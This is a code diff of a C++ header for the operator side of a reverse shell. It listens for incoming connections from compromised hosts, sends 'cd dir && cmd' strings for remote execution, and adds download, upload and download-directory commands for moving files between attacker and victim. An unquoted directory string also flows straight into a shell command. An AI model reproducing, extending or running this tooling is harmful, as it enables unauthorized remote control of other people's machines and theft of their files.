@@ -3,28 +3,10 @@
 // reverse shell header file using IPV4 
 // binds socket and listens for incoming connection
 
-#include <iostream>
-#include <string>
-#include <thread>
-#include <sys/time.h>
-#include <cstring>
-#include <vector>
-#include <ctime>
-#include <map>
-#include <signal.h> // used to handle SIGPIPE
-#include <fstream>
+#include "utils.hpp"
 
-//NETWORKING
-#include <unistd.h>
-#include <netinet/in.h>
-#include <sys/socket.h>
-#include <sys/types.h>
-#include <limits.h>
-#include <arpa/inet.h>
-#include <netdb.h>
-
-#define BUFFER_SIZE 4096
-#define DOWNLOAD_DIR "/home/user/Downloads" // download directory
+const unsigned int BUFFER_SIZE = 9999;
+std::string DOWNLOAD_DIR = "/home/amir/Downloads";
 
 struct mainsh{
     std::vector<std::string> logs; // stores all the previous commands and exact time
@@ -100,6 +82,26 @@ struct mainsh{
         std::chrono::seconds duration(5);
         std::this_thread::sleep_for(duration);
     }
+    
+    // used to get terminal output
+    std::string system_output(std::string cmd) {
+        std::string data;
+        FILE * stream;
+
+        char buffer[BUFFER_SIZE];
+        cmd.append(" 2>&1");
+
+        stream = popen(cmd.c_str(), "r");
+        if (stream){
+        while (!feof(stream)){
+            if(fgets(buffer, BUFFER_SIZE, stream) != NULL){ data.append(buffer);}
+        }
+        pclose(stream);
+            
+        }
+        return data;
+ 
+    }
 
     // prints previous commands
     void view_logs(){
@@ -124,6 +126,11 @@ struct mainsh{
         exit(1);
     }
 
+    void help(){
+
+
+    }
+
     // sends buffer to socket and stores it in logs
     void send_bytes(std::string buffer){
         char temp[buffer.length()+1];
@@ -141,6 +148,22 @@ struct mainsh{
         }
         else{logs.push_back(timer + dcrypt(temp));}
         
+    }
+
+    // used to split string
+    template<typename out>
+    void split(const std::string &s, char delim, out result) {
+        std::stringstream ss(s);
+        std::string item;
+        while (std::getline(ss, item, delim)) {
+            *(result++) = item;
+        }
+    }
+
+    std::vector<std::string> split(const std::string &s, char delim) {
+        std::vector<std::string> elems;
+        split(s, delim, std::back_inserter(elems));
+        return elems;
     }
 
     // creates socket and return pointer
@@ -184,11 +207,13 @@ struct mainsh{
         std::cout << "[?] socket created at " << ptr_serversd << std::endl;
         struct timeval start1, end1;
         gettimeofday(&start1, NULL);
-
+        
+        // shsecond sending account name, hostname and directory
         char client_name[30];
         char client_hostname[30];
         char dir[30];
 
+        // null terminator to stop printing garbage
         memset(client_name, '\0', sizeof(client_name));
         memset(client_hostname, '\0', sizeof(client_hostname));
         memset(dir, '\0', sizeof(dir));
@@ -271,7 +296,26 @@ struct mainsh{
                 memset(&buffer, 0x00, sizeof(buffer));
             }
 
+            // managing the download directory
+            else if(arg == "downloadir" || arg == "showdownloadir"){
+                std::string dir = cmd.substr(11, cmd.length());
+                std::string dir_cmd = "if test -d "+dir+"; then echo \"exist\"; fi ";
+
+                if(arg == "showdownloadir"){ std::cout << "DOWNLOAD_DIR = " << DOWNLOAD_DIR << std::endl;}
+
+                // checks if dir exists
+                else if(system_output(dir_cmd).substr(0, system_output(dir_cmd).length()-1) == "exist"){
+                    std::cout << "[+] download directory has been changed from " << DOWNLOAD_DIR << " to " << dir << std::endl;
+                    DOWNLOAD_DIR = dir;
+                }
+
+                // if not error message
+                else{std::cout << "[-] directory does not exist" << std::endl;}
+            }
+
+            // download file (text based)
             else if(arg == "download"){
+                //$ download (file dir)
                 std::string file_cmd = "touch " + std::string(DOWNLOAD_DIR) + cmd.substr(9, cmd.length());
                 std::string f = std::string(DOWNLOAD_DIR) + "/" + cmd.substr(9, cmd.length());
                 std::cout << "file downloaded at: " << f << std::endl;
@@ -281,14 +325,32 @@ struct mainsh{
                 
                 std::ofstream file;
                 file.open(f);
-                file << dcrypt(buffer);
-                file << "\n";
+                file << dcrypt(buffer) << std::endl;// dcrypting buffer
                 file.close();
-                
-                
-                
             }
 
+            // updload files (text based)
+            else if(arg == "upload"){
+                try{
+                    send_bytes(cmd);
+                    //$ upload (file dir) (desired dir) (name)
+                    std::vector<std::string> vec = split(cmd, ' ');
+                    std::string file_dir = vec[1];
+                    std::string desired_dir = vec[2];
+                    // std::string file_name = vec[3];
+
+                    // fetch data using system_output
+                    std::string dt_file = system_output("cat "+file_dir);
+                    // send it 
+                    send_bytes(dt_file.c_str());
+                }
+
+                catch(...){ std::cout << "[-] unfortunately that didn't work out..." << std::endl;}
+            }
+            
+            else if(arg == "help"){ help();}
+
+            // sends command
             else{
                 std::string ncmd = ("cd " + str_dir + " && " + cmd);
                 send_bytes(ncmd);
